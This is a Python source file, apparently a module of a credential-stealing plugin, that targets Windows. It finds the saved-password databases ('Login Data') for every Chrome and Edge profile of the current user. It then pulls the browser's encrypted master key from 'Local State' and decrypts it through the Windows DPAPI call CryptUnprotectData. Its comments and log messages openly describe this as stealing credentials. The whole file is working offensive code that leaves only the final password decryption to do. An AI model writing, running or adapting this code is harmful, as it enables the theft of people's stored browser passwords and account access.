# NOTE: This only tries stealing credentials from the current user,
#       so no DPAPI logic is implemented yet. That requires more research.
#       We can decide to do this now or in a new version of the plugin.
#       (WinAPI is used for current user, DPAPI is used otherwise.)


import base64
import getpass
import json
import logging
import os
from ctypes import (
    POINTER,
    Structure,
    WinDLL,
    byref,
    c_buffer,
    c_char,
    create_string_buffer,
    memmove,
    sizeof,
)
from ctypes.wintypes import BOOL, DWORD, HANDLE, HWND, LPCWSTR, LPVOID, LPWSTR
from pathlib import PurePath
from typing import Optional, Sequence, Set, Tuple

logger = logging.getLogger(__name__)


class DATA_BLOB(Structure):
    _fields_ = [("cbData", DWORD), ("pbData", POINTER(c_char))]


class CRYPTPROTECT_PROMPTSTRUCT(Structure):
    _fields_ = [
        ("cbSize", DWORD),
        ("dwPromptFlags", DWORD),
        ("hwndApp", HWND),
        ("szPrompt", LPCWSTR),
    ]


PCRYPTPROTECT_PROMPTSTRUCT = POINTER(CRYPTPROTECT_PROMPTSTRUCT)

crypt32 = WinDLL("crypt32", use_last_error=True)
kernel32 = WinDLL("kernel32", use_last_error=True)

LocalFree = kernel32.LocalFree
LocalFree.restype = HANDLE
LocalFree.argtypes = [HANDLE]

CryptUnprotectData = crypt32.CryptUnprotectData
CryptUnprotectData.restype = BOOL
CryptUnprotectData.argtypes = [
    POINTER(DATA_BLOB),
    POINTER(LPWSTR),
    POINTER(DATA_BLOB),
    LPVOID,
    PCRYPTPROTECT_PROMPTSTRUCT,
    DWORD,
    POINTER(DATA_BLOB),
]


def getData(blobOut):
    cbData = blobOut.cbData
    pbData = blobOut.pbData
    buffer = create_string_buffer(cbData)
    memmove(buffer, pbData, sizeof(buffer))
    LocalFree(pbData)
    return buffer.raw


def Win32CryptUnprotectData(cipherText, entropy=False):
    decrypted = None

    bufferIn = c_buffer(cipherText, len(cipherText))
    blobIn = DATA_BLOB(len(cipherText), bufferIn)
    blobOut = DATA_BLOB()

    if entropy:
        bufferEntropy = c_buffer(entropy, len(entropy))
        blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)

        if CryptUnprotectData(
            byref(blobIn), None, byref(blobEntropy), None, None, 0, byref(blobOut)
        ):
            decrypted = getData(blobOut)

    else:
        if CryptUnprotectData(byref(blobIn), None, None, None, None, 0, byref(blobOut)):
            decrypted = getData(blobOut)

    return decrypted


DRIVE = "C"
LOCAL_APPDATA = "{drive}:\\Users\\{user}\\AppData\\Local"

WINDOWS_BROWSERS = {
    "Chromium Edge": "{local_appdata}\\Microsoft\\Edge\\User Data",
    "Google Chrome": "{local_appdata}\\Google\\Chrome\\User Data",
}


class WindowsCredentialsDatabaseSelector:
    def __init__(self):
        user = getpass.getuser()
        local_appdata = LOCAL_APPDATA.format(drive=DRIVE, user=user)

        self._browsers = {}
        for browser_name, browser_directory in WINDOWS_BROWSERS.items():
            self._browsers[browser_name] = browser_directory.format(local_appdata=local_appdata)

    def __call__(self) -> Sequence[PurePath]:
        return self._get_database_dirs()

    # TODO: use pathlib.Path objects everywhere, not str
    def _get_database_dirs(self) -> Tuple[Set[str], Optional[bytes]]:
        """
        Get browsers' credentials' database directories for current user
        """

        databases: Set[str] = set()

        for browser_name, browser_installation_path in self._browsers.items():
            logger.info(f'Attempting to steal credentials from browser "{browser_name}"')

            local_state_file_path = os.path.join(browser_installation_path, "Local State")
            if os.path.exists(local_state_file_path):
                master_key = None

                # user profiles in the browser; empty string means current dir, without a profile
                browser_profiles = {"Default", ""}

                # get all additional browser profiles
                for dirs in os.listdir(browser_installation_path):
                    dirs_path = os.path.join(browser_installation_path, dirs)
                    if os.path.isdir(dirs_path) and dirs.startswith("Profile"):
                        browser_profiles.add(dirs)

                with open(local_state_file_path) as f:
                    try:
                        local_state_object = json.load(f)
                    except json.decoder.JSONDecodeError as err:
                        logger.error(
                            f'Couldn\'t deserialize JSON file at "{local_state_file_path}": {err}'
                        )
                        local_state_object = {}

                    try:
                        # add user profiles from "Local State" file
                        browser_profiles |= set(local_state_object["profile"]["info_cache"])
                    except Exception as err:
                        logger.error(
                            "Exception encountered while trying to load user profiles "
                            f"from browser's local state: {err}"
                        )

                    try:
                        master_key = base64.b64decode(
                            local_state_object["os_crypt"]["encrypted_key"]
                        )
                        master_key = master_key[5:]  # removing DPAPI
                        master_key = Win32CryptUnprotectData(
                            master_key,
                        )
                    except Exception as err:
                        logger.error(
                            "Exception encountered while trying to get master key "
                            f"from browser's local state: {err}"
                        )
                        master_key = None

                # each user profile has its own password database
                for profile in browser_profiles:
                    try:
                        db_files = os.listdir(os.path.join(browser_installation_path, profile))
                    except Exception as err:
                        logger.error(
                            "Exception encountered while trying to get "
                            f'password database file for user profile "{profile}": {err}'
                        )

                    for db in db_files:
                        if db.lower() == "login data":
                            databases.add(os.path.join(browser_installation_path, profile, db))

        return databases, master_key
